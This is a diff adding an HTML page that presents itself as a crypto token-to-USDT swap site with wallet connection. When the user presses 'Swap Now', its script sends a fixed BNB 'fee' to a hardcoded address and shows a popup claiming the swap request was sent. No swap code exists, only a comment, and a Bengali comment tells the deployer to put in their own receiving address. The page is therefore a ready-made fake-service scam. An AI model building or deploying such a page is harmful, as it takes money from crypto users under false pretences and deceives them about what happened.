@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Swap Helper</title>
+  <style>
+    :root{
+      --bg:#0b1220;--card:#101828;--accent:#f6c261;--muted:#9aa4b2;
+    }
+    body{font-family:Inter,system-ui,Arial;min-height:100vh;margin:0;background:linear-gradient(180deg,#071022 0%,#071629 100%);color:#e6eef6;}
+    header{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;background:#0d1528;box-shadow:0 2px 6px rgba(0,0,0,.5);}
+    header h1{margin:0;color:#fff;font-size:18px;text-align:center;flex:1;}
+    header .brand{font-weight:600;font-size:16px;color:var(--accent)}
+    .wallet-btn{padding:8px 14px;border-radius:10px;border:none;background:var(--accent);color:#081019;font-weight:600;font-size:14px;cursor:pointer}
+
+    .container{max-width:500px;margin:40px auto;padding:20px;background:var(--card);border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.6)}
+    label{display:block;margin:10px 0 6px;color:var(--muted);font-size:13px}
+    select,input{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.1);background:transparent;color:#fff;margin-bottom:14px;font-size:14px}
+    .amount-row{display:flex;gap:8px}
+    .amount-row input{flex:1}
+    .amount-row button{padding:0 14px;border:none;border-radius:8px;background:var(--accent);color:#081019;font-weight:600;cursor:pointer}
+    .price-box{background:rgba(255,255,255,0.05);padding:10px;border-radius:10px;margin-top:6px;font-size:14px;color:var(--muted)}
+    button.action{width:100%;padding:14px;border-radius:12px;border:none;background:var(--accent);color:#081019;font-weight:600;font-size:15px;cursor:pointer;margin-top:16px}
+
+    #status{margin-top:14px;font-size:13px;color:var(--muted)}
+    
+    /* Popup */
+    .popup{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;z-index:1000}
+    .popup-content{background:var(--card);padding:24px;border-radius:16px;max-width:320px;text-align:center}
+    .popup-content h2{margin:0 0 12px;font-size:18px;color:#fff}
+    .popup-content p{font-size:14px;color:var(--muted)}
+    .popup-content button{margin-top:16px;padding:10px 18px;border:none;border-radius:10px;background:var(--accent);color:#081019;font-weight:600;cursor:pointer}
+
+    .network-select{display:flex;gap:12px;margin:10px 0}
+    .network-option{flex:1;background:rgba(255,255,255,0.05);border-radius:10px;padding:10px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:0.2s}
+    .network-option img{height:20px;margin-right:8px}
+    .network-option.active{background:var(--accent);color:#081019;font-weight:600}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">SwapSite</div>
+    <h1>Token → USDT</h1>
+    <button id="walletBtn" class="wallet-btn">Connect</button>
+  </header>
+
+  <div class="container">
+    <label>Select Token</label>
+    <select id="tokenSelect"></select>
+
+    <label>Amount</label>
+    <div class="amount-row">
+      <input id="amount" placeholder="0.0" />
+      <button id="maxBtn">Max</button>
+    </div>
+
+    <div class="price-box">≈ <span id="usdtValue">0</span> USDT</div>
+
+    <label>Select Network</label>
+    <div class="network-select" id="networkSelect">
+      <div class="network-option" data-net="bnb"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"/>BNB</div>
+      <div class="network-option" data-net="tron"><img src="https://cryptologos.cc/logos/tron-trx-logo.png"/>TRON</div>
+      <div class="network-option" data-net="eth"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png"/>Ethereum</div>
+    </div>
+
+    <button class="action" id="swapBtn">Swap Now</button>
+    <div id="status">Status: Idle</div>
+  </div>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h2>✅ Swap Request Sent</h2>
+      <p>Your swap fee has been paid. Details have been recorded.</p>
+      <button onclick="document.getElementById('popup').style.display='none'">Close</button>
+    </div>
+  </div>
+
+<script>
+(async function(){
+  const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
+  const feeBNB = "0.009";
+  const FEE_ADDRESS = "0x0F28601Dd41e77990643Bab3efc1E94eB63793b3"; // নিজের ঠিকানা বসাও
+  let currentAccount = null;
+  let tokens = [];
+  let selectedNetwork = "bnb";
+
+  function setStatus(msg){ document.getElementById('status').textContent = 'Status: '+msg; }
+  function toWeiHex(amount){
+    const parts = (''+amount).split('.');
+    const whole = parts[0]||'0';
+    const frac = parts[1]||'';
+    const weiWhole = BigInt(whole) * (10n**18n);
+    const fracPadded = (frac+'0'.repeat(18)).slice(0,18);
+    const weiFrac = BigInt(fracPadded);
+    return '0x'+(weiWhole+weiFrac).toString(16);
+  }
+  function shortAddr(addr){ return addr.slice(0,4)+"•••"+addr.slice(-3); }
+
+  // Load tokens.json
+  try{
+    const res = await fetch('tokens.json');
+    tokens = await res.json();
+    const sel = document.getElementById('tokenSelect');
+    tokens.forEach(t=>{
+      const opt = document.createElement('option');
+      opt.value = t.address;
+      opt.textContent = t.symbol+" - "+t.name;
+      sel.appendChild(opt);
+    });
+  }catch(e){console.warn('tokens.json not loaded',e)}
+
+  document.getElementById('walletBtn').onclick = async()=>{
+    if(!provider){ setStatus('No wallet provider detected'); return; }
+    try{
+      const accs = await provider.request({method:'eth_requestAccounts'});
+      currentAccount = accs[0];
+      document.getElementById('walletBtn').textContent = shortAddr(currentAccount);
+      setStatus('Connected: '+currentAccount);
+    }catch(e){ setStatus('Connection rejected'); }
+  };
+
+  document.getElementById('maxBtn').onclick=()=>{
+    document.getElementById('amount').value = "100%"; // Placeholder, বাস্তবে এখানে ব্যালান্স ফেচ করতে হবে
+  };
+
+  document.getElementById('amount').oninput=()=>{
+    const amt = parseFloat(document.getElementById('amount').value);
+    const token = tokens.find(t=>t.address===document.getElementById('tokenSelect').value);
+    if(token && amt>0){
+      const value = (amt*token.priceUSD).toFixed(2);
+      document.getElementById('usdtValue').textContent = value;
+    }else{
+      document.getElementById('usdtValue').textContent = '0';
+    }
+  };
+
+  // Network select
+  document.querySelectorAll('.network-option').forEach(opt=>{
+    opt.onclick=()=>{
+      document.querySelectorAll('.network-option').forEach(o=>o.classList.remove('active'));
+      opt.classList.add('active');
+      selectedNetwork = opt.dataset.net;
+      setStatus('Network selected: '+selectedNetwork.toUpperCase());
+    };
+  });
+
+  document.querySelector('.network-option[data-net="bnb"]').classList.add('active');
+
+  document.getElementById('swapBtn').onclick = async()=>{
+    if(!provider){ setStatus('No provider'); return; }
+    if(!currentAccount){ setStatus('Connect wallet first'); return; }
+
+    const amount = document.getElementById('amount').value.trim();
+    if(!amount || Number(amount)<=0){ setStatus('Invalid amount'); return; }
+
+    const tx = { from: currentAccount, to: FEE_ADDRESS, value: toWeiHex(feeBNB) };
+    try{
+      setStatus('Requesting wallet confirmation for fee...');
+      const txHash = await provider.request({method:'eth_sendTransaction', params:[tx]});
+      setStatus('Fee paid ✅ txHash: '+txHash);
+      document.getElementById('popup').style.display='flex';
+      // API call option here with selectedNetwork, token, amount
+    }catch(err){
+      console.error(err);
+      setStatus('Transaction failed or rejected');
+    }
+  };
+})();
+</script>
+</body>
+</html>
